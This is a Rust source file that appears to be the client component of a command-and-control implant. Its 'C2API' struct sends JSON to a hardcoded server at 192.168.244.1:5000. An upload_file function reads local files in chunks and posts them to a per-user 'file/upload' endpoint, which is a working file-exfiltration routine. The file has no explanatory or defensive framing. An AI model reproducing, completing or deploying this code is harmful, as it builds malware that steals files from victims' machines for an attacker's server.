use reqwest::{
    blocking::multipart::{Form, Part},
    Client, Error, Response,
};
use serde_json::{json, Value};
use std::{
    collections::HashMap,
    fs::File,
    io::{self, Read, Seek},
    str::FromStr,
};

pub struct C2API {
    pub base_url: String,
    api_client: Client,
}

impl C2API {
    pub fn new() -> Self {
        C2API {
            base_url: String::from_str("http://192.168.244.1:5000/api/").unwrap(),
            api_client: reqwest::Client::new(),
        }
    }

    async fn format_response(self, response: Result<Response, Error>) -> HashMap<String, Value> {
        match response {
            Ok(res) => {
                let api_res: HashMap<String, Value> = match res.json().await {
                    Ok(res) => res,
                    Err(error) => {
                        println!("{}", error);
                        HashMap::from([
                            (String::from("data"), json!({})),
                            (
                                String::from("error"),
                                json!({"errorMsg": "Could not Deserialize response !"}),
                            ),
                        ])
                    }
                };
                api_res
            }
            Err(error) => {
                if error.is_status() {
                    println!("{}", error.status().unwrap());
                    return HashMap::from([
                        (String::from("data"), json!({})),
                        (String::from("error"), json!({"errorMsg": "Bad status "})),
                    ]);
                }
                return HashMap::from([
                    (String::from("data"), json!({})),
                    (
                        String::from("error"),
                        json!({"errorMsg": "Something went wrong, good luck lol !"}),
                    ),
                ]);
            }
        }
    }

    pub async fn post(self, json_body: &Value, uri: &str) -> HashMap<String, Value> {
        let api_res = self
            .api_client
            .post(self.base_url.clone() + &uri)
            .json(json_body)
            .send()
            .await;

        self.format_response(api_res).await
    }

    pub fn upload_file(
        self,
        file_path: String,
        user_id: &str,
    ) -> Result<(), Box<dyn std::error::Error>> {
        const CHUNK_SIZE: usize = 1024 * 1024 * 200; // Chunk size in bytes (200MB)
                                                     // Open the file for reading
        let file = File::open(file_path.clone())?;
        let file_size = file.metadata()?.len() as usize;

        // Calculate the number of chunks based on the file size and chunk size
        let num_chunks = (file_size as f64 / CHUNK_SIZE as f64).ceil() as usize;

        // Create a reusable client instance
        let client = reqwest::blocking::Client::new();

        // Iterate over the chunks and send each chunk as a separate part in the multipart request
        for chunk_index in 0..num_chunks {
            // Calculate the start and end positions of the chunk in the file
            let start = chunk_index * CHUNK_SIZE;
            let mut end = start + CHUNK_SIZE;
            if end > file_size {
                end = file_size;
            }

            // Read the chunk from the file
            let mut chunk_data = vec![0u8; (end - start) as usize];
            let mut file_part = io::BufReader::new(file.try_clone()?);
            file_part.seek(io::SeekFrom::Start(start as u64))?;
            file_part.read_exact(&mut chunk_data)?;

            // Create the multipart/form-data request payload for the chunk
            let part = Part::bytes(chunk_data)
                .file_name(file_path.clone())
                .mime_str("application/octet-stream")?;

            let form = Form::new().part("file", part);

            // Make the HTTP POST request for the chunk
            let response = client
                .post(self.base_url.clone() + "file/upload/" + &user_id)
                .multipart(form)
                .header(
                    "Content-Range",
                    format!("bytes {}-{}/{}", start, end - 1, file_size),
                )
                .send()?;

            // Handle the server response for the chunk
            if response.status().is_success() {
                println!("Chunk {} uploaded successfully!", chunk_index);
            } else {
                println!(
                    "Chunk {} upload failed. Server response: {:?}",
                    chunk_index, response
                );
                // Handle error or retry if needed
            }
        }

        Ok(())
    }
}
